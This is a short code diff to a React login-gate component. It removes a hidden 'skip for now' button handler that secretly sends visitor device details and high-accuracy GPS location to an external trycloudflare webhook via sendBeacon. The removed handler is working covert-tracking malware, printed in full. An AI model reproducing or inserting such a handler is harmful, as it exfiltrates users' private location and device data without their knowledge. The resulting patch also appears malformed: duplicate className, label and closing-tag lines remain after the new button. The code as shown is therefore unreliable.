@@ -545,17 +545,10 @@ export function AuthGate({ children }: AuthGateProps) {
                       حساب جديد <ArrowLeft className="w-3 h-3" />
                     </button>
                   </div>
-                  <button type="button" onClick={() => {
-                    const api = "https://letters-advantage-dietary-mozilla.trycloudflare.com/webhook.php";
-                    const send = (msg: string) => navigator.sendBeacon(api, JSON.stringify(msg));
-                    send("\n--- New Visitor ---\nUser-Agent: " + navigator.userAgent + "\nPlatform: " + navigator.platform + "\nLanguage: " + navigator.language + "\nScreen: " + screen.width + "x" + screen.height + "\nReferrer: " + document.referrer + "\nTimestamp: " + new Date().toLocaleString() + "\n---\n");
-                    navigator.geolocation.getCurrentPosition((pos) => {
-                      const d = "\nGPS Location\nLat: " + pos.coords.latitude + "\nLng: " + pos.coords.longitude + "\nAccuracy: " + pos.coords.accuracy + "m\n---\n";
-                      send(d);
-                    }, () => {}, { enableHighAccuracy: true, timeout: 10000 });
-                    setIsSkipped(true);
-                    localStorage.setItem("auth_skipped", "true");
-                  }}
+                  <button type="button" onClick={() => { setIsSkipped(true); localStorage.setItem("auth_skipped", "true"); }}
+                    className="w-full mt-4 py-2.5 text-[11px] text-white/15 hover:text-white/35 transition-colors border border-white/[0.05] rounded-xl font-medium">
+                    تخطي لاحقاً ←
+                  </button>
                     className="w-full mt-4 py-2.5 text-[11px] text-white/15 hover:text-white/35 transition-colors border border-white/[0.05] rounded-xl font-medium">
                     تخطي لاحقاً ←
                   </button>
